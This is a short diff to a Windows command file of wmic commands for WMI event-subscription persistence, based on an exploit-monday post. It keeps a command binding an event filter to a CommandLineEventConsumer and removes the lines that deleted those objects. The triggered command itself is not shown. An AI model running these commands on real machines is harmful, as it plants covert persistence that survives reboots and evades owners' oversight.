@@ -1,4 +1,4 @@
-Based on http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html
+:: Based on http://www.exploit-monday.com/2016/08/wmi-persistence-using-wmic.html
 
 :: the following command are meant for cmd but can be used with wmic.exe by simply writing them without the wmic at the start.
 
@@ -10,9 +10,3 @@ wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name=
 
 :: Create a __FilterToConsumerBinding instance
 wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter='\\.\root\subscription:__EventFilter.Name="BugSecFilter"', Consumer='\\.\root\subscription:CommandLineEventConsumer.Name="BugSecConsumer"'
-
-:: Delete instaces of WMI
-wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter WHERE Name="BugSecFilter" DELETE
-wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="BugSecConsumer" DELETE
-wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding WHERE Filter='\\\\.\\root\\subscription:__EventFilter.Name="BugSecFilter"' DELETE
-
